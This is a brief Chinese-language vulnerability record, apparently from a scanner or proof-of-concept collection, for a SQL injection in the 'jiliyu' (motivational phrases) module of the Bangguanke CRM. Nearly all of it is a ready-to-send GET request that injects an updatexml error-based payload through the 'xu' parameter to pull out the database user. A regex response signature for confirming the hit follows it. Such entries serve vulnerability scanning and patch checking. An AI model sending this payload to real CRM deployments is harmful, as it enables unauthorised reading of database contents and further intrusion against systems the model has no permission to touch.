# 帮管客crmjiliyusql注入漏洞

帮管客crmjiliyu ｜ SQL注入 ｜ —

**Payload**
```
GET
/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20user()),0x7f),1)) HTTP/1.1
```
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$